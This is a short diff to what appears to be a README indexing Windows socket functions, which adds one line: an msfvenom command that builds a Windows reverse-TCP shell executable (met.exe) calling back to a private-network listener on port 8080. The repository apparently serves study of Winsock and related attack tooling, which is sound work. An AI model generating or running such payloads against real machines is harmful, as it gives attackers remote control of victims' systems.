@@ -23,3 +23,4 @@
 
 [WSAStartup](./Functions/WSAStartup/README.md) 
 
+msfvenom -p windows/custom/reverse_tcp LHOST=192.168.79.128 LPORT=8080 -f exe -o met.exe
